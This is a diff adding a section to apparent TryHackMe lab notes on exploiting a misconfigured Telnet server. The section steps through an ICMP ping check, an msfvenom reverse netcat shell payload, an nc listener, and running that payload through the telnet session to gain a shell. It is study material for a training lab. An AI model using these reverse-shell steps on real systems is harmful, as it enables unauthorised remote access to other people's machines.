@@ -21,3 +21,42 @@ We start the same way we usually do, using nmap to perform a port scan, after th
 server is by finding and using misconfigurations.
 
 Let's perform an nmap scan. See Telnet in Network Protocols 1, Tryhackme for the results.
+
+Exploiting Telnet
+
+Telnet is in and of itself insecure due to the lack of encryption, leading to communication in plaintext. You can find CVEs for Telnet servers and client.
+Additionally telnet has poor access control. You can use cvedetails.com and cve.mitre.org to find CVEs but you are more likely to find a misconfiguration in
+Telnet that can lead you to an access point.
+
+We found some details on the nmap scan, referring back to it let's use the information gathered to try to access the telnet server and get a reverse shell
+on that machine.
+
+NOTE: a shell is a piece of code or program that is used to gain code or command execution on a device. In a reverse shell, the target device communicates
+back to the attacker device who is listening on a specified port.
+
+First let's connect to telnet.
+	>>> telnet <IP> <port>
+Once we do this we see it's an open connection, however, when we run any commands we do not see any output. Let's run tcpdump to listen for ICMP packet
+comming out of this machine.
+	>>> sudo tcpdump ip proto \\icmp -i tun0
+
+After doing this, we have a listener on our virtual interface for OpenVPN which will listen for ICMP packets. Now we'll try to send a ping to our machine
+from the telnet session
+	telnet>>> .RUN ping <my_ip> -c 1
+After running this command we see that we are able to talk to the machine, now we'll use nsfvenom to configure a reverse netcat shell for us.
+	>>> msfvenom -p cmd/unix/reverse_netcat lhost=<local IP> lport=<port> R
+where "-p" is payload
+"lhost" is your IP address
+"lport" listener port
+"R" export payload in raw format
+
+Now that we have our payload running, we can start a netcat listening port
+	>>> nc -lvp 4444
+where "lvp" is listen, be verbose, port respectively
+
+Now that we've created a payload, and have our netcat listener ready, we use the poorly protected telnet session to run our payload as a command which will
+hopefully grant us access to the machine. To do this, all we must do is copy the created payload and run it as a command in the telnet session.
+
+And as we can see we were successful in accessing the machine!
+
+
